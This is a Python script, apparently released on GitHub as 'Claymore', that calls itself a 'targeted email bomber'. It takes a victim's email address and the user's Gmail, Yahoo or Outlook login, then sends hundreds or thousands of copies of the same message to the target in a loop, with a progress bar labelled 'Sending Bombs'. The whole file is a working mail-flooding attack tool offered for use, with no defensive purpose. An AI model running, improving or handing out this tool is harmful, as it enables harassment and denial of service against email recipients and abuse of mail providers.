import sys
import smtplib
import time
import os
from progress.spinner import Spinner
from tqdm import trange

def poster():
    print( ''' 
                                   TARGETED EMAIL BOMBER \u001b[31m
 ______     __         ______     __  __     __    __     ______     ______     ______    
/\  ___\   /\ \       /\  __ \   /\ \_\ \   /\ "-./  \   /\  __ \   /\  == \   /\  ___\    
\ \ \____  \ \ \____  \ \  __ \  \ \____ \  \ \ \-./\ \  \ \ \/\ \  \ \  __<   \ \  __\    
 \ \_____\  \ \_____\  \ \_\ \_\  \/\_____\  \ \_\ \ \_\  \ \_____\  \ \_\ \_\  \ \_____\ 
  \/_____/   \/_____/   \/_/\/_/   \/_____/   \/_/  \/_/   \/_____/   \/_/ /_/   \/_____/
                                                                              version 1.1.4 \u001b[0m
                                                      \u001b[32m Developed by:\u001b[33m'THE P0intMaN'\u001b[0m
                                        
              
                                                    
                       \u001b[34mTo know more about Claymore, visit www.github.com/P0intMaN/Claymore\u001b[0m 
                       
                       
                                                                    \u001b[0m    ''')
    

def interact():
    mylist = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}
    bar = Spinner('Setting up Packages    ',max = len(mylist) )
    for items in mylist:
        bar.next()
        time.sleep(0.2)
        


class Clay_more():
    count = 0
    def __init__ (self):
        try:
            print("\n\n\n\n\u001b[33m------ INITIALISING CLAYMORE INTERFACE ------\u001b[0m")
            time.sleep(2)
            self.target = str(input("\n\u001b[32mEnter the target Email ID -->\u001b[0m "))
            self.mode = int(input("\u001b[32mEnter the Bomb Mode [ 1,2,3,4 ]\u001b[36m || 1:(1000) 2:(500) 3:(100) 4:(Custom)\u001b[0m -->\u001b[0m "))
            if self.mode > int(4) or self.mode < int(1):
                print("\n\u001b[31mERROR!: Invalid Input. Interface Closing Now...\u001b[0m")
                sys.exit(1)
        except Exception as e:
            print(f"\n\n\u001b[31mERROR!: {e}\u001b[0m")

    
    def bomb(self):
        try:
            print("\n\n\u001b[33m------ CONFIGURING THE BOMB ------\u001b[0m")
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(100)
            else:
                self.amount = int(input("\n\u001b[32mEnter the Bomb Amount -->\u001b[0m "))
                print("\n\u001b[32mYour Bomb Mode is:\u001b[0m\u001b[35m {}\u001b[0m\u001b[32m and Amount is:\u001b[0m\u001b[35m {}\u001b[0m".format(self.mode, self.amount))
        except Exception as e:
            print(f'\n\u001b[32mERROR!:{e}\u001b[0m')
            sys.exit(1)
            
                
    def sandp(self):
        try:
            print("\n\n\u001b[33m------ SETUP THE EMAIL ------\u001b[0m")
            self.server = str(input("\n\u001b[32mEnter Email Server OR Select the Options -->\u001b[0m \u001b[36m1: GMAIL  2: YAHOO  3: OUTLOOK -->\u001b[0m "))
            premade = ['1','2','3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input("\u001b[32mEnter the target PORT -->\u001b[0m "))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            
            self.yourAddr = str(input("\n\u001b[32mEnter Sender's Email -->\u001b[0m "))
            self.yourKey = str(input("\u001b[32mEnter Password -->\u001b[0m "))
            self.subject = str(input("\u001b[32mEnter Subject -->\u001b[0m "))
            self.message = str(input("\u001b[32mEnter Message (Optional)-->\u001b[0m "))
            self.msg = '''From: %s\nTo: %s\nSubject: %s\nMessage: %s\n
            ''' %(self.yourAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo() #electronic hello
            self.s.starttls() #TLS
            self.s.ehlo()
            self.s.login(self.yourAddr, self.yourKey)
        except Exception as e:
            print(f'\n\u001b[31mERROR!: {e}\u001b[0m')
            sys.exit(1)


    def send(self):
        try:
            self.s.sendmail(self.yourAddr, self.target, self.msg)
            #self.count+=1  #Email_Bomber().count
            #print(f'\u001b[34m\nBOMBS :\u001b[0m {self.count}')
        except Exception as e:
            print(f'\u001b[31mERROR!: {e}\u001b[0m')
            sys.exit(1)


    def execute(self):
        print("\n\n\u001b[33m------ CLAYMORING THE TARGET ------\u001b[0m\n\n")
        try:
            for email in trange(self.amount, desc= "Sending Bombs...", unit = "bomb"):
                self.send()
            self.s.close()
            print("\n\n\u001b[33m------ CLAYMORES HAVE BEEN PLANTED SUCCESSFULLY ------\u001b[0m")
            print("\n\n\u001b[33m------ THANKS FOR USING CLAYMORE!! ------\u001b[0m")
            time.sleep(10)
            sys.exit(0)
        except Exception as e:
            print(f'\u001b[31mERROR!: {e}\u001b[0m')
            sys.exit(1)


if __name__ == "__main__":
    os.system('cls')
    poster()
    interact()
    claymore = Clay_more()
    claymore.bomb()
    claymore.sandp()
    claymore.execute()
